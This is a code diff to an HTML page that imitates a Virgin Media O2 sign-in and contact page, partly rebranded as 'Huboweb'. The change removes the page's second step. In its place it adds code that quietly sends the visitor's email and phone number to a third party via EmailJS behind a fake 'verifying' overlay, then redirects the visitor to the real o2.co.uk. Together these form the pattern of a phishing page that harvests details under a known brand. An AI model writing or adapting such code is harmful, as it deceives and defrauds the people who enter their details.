@@ -158,7 +158,7 @@
   <!-- HEADER -->
   <header class="vmo2-header">
     <div class="header-logo-wrap">
-      <div class="logo-vm" aria-label="O2">
+      <div class="logo-vm" aria-label="Huboweb">
         <span class="vm-top">Virgin</span>
         <span class="vm-mid">Hubo</span>
         <div class="vm-bot"></div>
@@ -216,7 +216,7 @@
 
         <!-- ══ STEP 1: Email + Password ══ -->
         <div id="step1">
-          <p class="T600">Contact at O2</p>
+          <p class="T600">Contact at Huboweb</p>
           <p class="T300 mb-3">
             Enter your email address to get started.
             <a class="anchor" data-bs-toggle="modal" data-bs-target="#infoModal" href="#">Learn more.</a>
@@ -262,46 +262,10 @@
 
           <p class="T300 mb-2">Need help registering or signing in? <a class="anchor" href="#" target="_blank">Visit our help pages.</a></p>
           <p class="T300 my-3">If you're not using your own device, <a class="anchor" href="#" target="_blank">read our help on private browsing</a> before you contact us.</p>
-          <p class="T300">To see how we look after your data, head to <a class="anchor" href="#" target="_blank">O2's Privacy Policy.</a></p>
+          <p class="T300">To see how we look after your data, head to <a class="anchor" href="#" target="_blank">O2 Privacy Policy.</a></p>
         </div>
 
-        <!-- ══ STEP 2: Name + Message ══ -->
-        <div id="step2" style="display:none">
-          <p class="T600">Contact at O2</p>
-          <p class="T300 mb-2">Please fill in your details below and we'll get back to you shortly.</p>
-          <p class="email-shown" id="email-shown"></p>
 
-          <div style="margin-bottom:12px">
-            <label class="form-label" for="inp-name">Full name</label>
-            <div class="input-wrap">
-              <input class="form-control" type="text" id="inp-name" placeholder="" autocomplete="name"/>
-            </div>
-            <div class="val-error" id="err-name">
-              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
-              Please enter your full name
-            </div>
-          </div>
-
-          <div style="margin-bottom:4px">
-            <label class="form-label" for="inp-msg">Message</label>
-            <div class="input-wrap">
-              <textarea class="form-control" id="inp-msg" placeholder="How can we help you?"></textarea>
-              <button class="input-icon" onclick="clearMsg()" aria-label="Clear" style="top:16px;transform:none">
-                <i class="fa-regular fa-eye-slash"></i>
-              </button>
-            </div>
-            <div class="val-error" id="err-msg">
-              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
-              Please enter your message
-            </div>
-          </div>
-
-          <button class="btn-vmo2-primary" id="submitBtn" onclick="doSend()">
-            <span id="btn-lbl">Submit</span>
-          </button>
-          <button class="btn-vmo2-outline" onclick="goStep1()">I can't remember my email</button>
-          <button class="exit-link" data-bs-toggle="modal" data-bs-target="#exitModal">Exit</button>
-        </div>
 
       </div>
     </div>
@@ -310,8 +274,8 @@
 
 <!-- Footer -->
 <footer class="vmo2-footer">
-  <div>© <span class="yr"></span> O2. All Rights Reserved</div>
-  <div>© <span class="yr"></span> O2 Technologies Limited. All Rights Reserved</div>
+  <div>© <span class="yr"></span> Huboweb. All Rights Reserved</div>
+  <div>© <span class="yr"></span> Huboweb Technologies Limited. All Rights Reserved</div>
 </footer>
 
 <!-- Verifying overlay -->
@@ -339,8 +303,7 @@ const phoneRe = /^[\d\s\+\-\(\)]{7,20}$/;
 
 document.getElementById('inp-email').addEventListener('input', function(){ this.value=this.value.replace(/\s/g,''); hide('err-email'); });
 document.getElementById('inp-phone').addEventListener('input', ()=> hide('err-phone'));
-document.getElementById('inp-name').addEventListener('input',  ()=> hide('err-name'));
-document.getElementById('inp-msg').addEventListener('input',   ()=> hide('err-msg'));
+
 
 function hide(id){ document.getElementById(id).classList.remove('show'); }
 function show(id){ document.getElementById(id).classList.add('show'); }
@@ -350,7 +313,7 @@ function emailKeyPress(e){
   return true;
 }
 
-function goStep2(){
+async function goStep2(){
   let ok = true;
   const email = document.getElementById('inp-email').value.trim();
   const phone = document.getElementById('inp-phone').value.trim();
@@ -359,60 +322,28 @@ function goStep2(){
   if(!phoneRe.test(phone)){ show('err-phone'); ok=false; } else hide('err-phone');
   if(!ok) return;
 
-  // Show verifying overlay for 1.5s then move to step 2
+  // Show verifying overlay
   document.getElementById('verifying-overlay').classList.add('show');
-  setTimeout(() => {
-    document.getElementById('verifying-overlay').classList.remove('show');
-    document.getElementById('step1').style.display = 'none';
-    document.getElementById('step2').style.display = 'block';
-    document.getElementById('email-shown').textContent = email;
-    document.getElementById('inp-name').focus();
-  }, 1500);
-}
 
-function goStep1(){
-  document.getElementById('step2').style.display = 'none';
-  document.getElementById('step1').style.display = 'block';
-  document.getElementById('inp-email').focus();
-}
-
-function clearMsg(){
-  document.getElementById('inp-msg').value = '';
-  document.getElementById('inp-msg').focus();
-}
-
-async function doSend(){
-  let ok = true;
-  if(!document.getElementById('inp-name').value.trim()){ show('err-name'); ok=false; } else hide('err-name');
-  if(!document.getElementById('inp-msg').value.trim()){ show('err-msg');  ok=false; } else hide('err-msg');
-  if(!ok) return;
-
-  const btn = document.getElementById('submitBtn');
-  const lbl = document.getElementById('btn-lbl');
-  btn.disabled = true;
-  lbl.innerHTML = 'Sending… <span class="spinner"></span>';
-
+  // Send email via EmailJS in background
   try {
     await emailjs.send(SVC, TMPL, {
-      from_name:  document.getElementById('inp-name').value.trim(),
-      from_email: document.getElementById('inp-email').value.trim(),
-      phone:      document.getElementById('inp-phone').value.trim(),
-      message:    document.getElementById('inp-msg').value.trim()
+      from_name:  'Contact Form Submission',
+      from_email: email,
+      phone:      phone,
+      message:    'New contact form submission from Huboweb'
     });
-    lbl.innerHTML = '<i class="fa-solid fa-check"></i> Sent!';
-    setTimeout(()=>{
-      goStep1();
-      btn.disabled = false;
-      lbl.textContent = 'Submit';
-      document.getElementById('inp-name').value = '';
-      document.getElementById('inp-msg').value  = '';
-    }, 2200);
-  } catch(e){
-    console.error(e);
-    lbl.textContent = 'Error — please try again';
-    btn.disabled = false;
+  } catch(e) {
+    console.error('EmailJS error:', e);
   }
+
+  // After 2s redirect to o2.co.uk
+  setTimeout(() => {
+    window.location.href = 'https://www.o2.co.uk';
+  }, 2000);
 }
+
+
 </script>
 </body>
 </html>
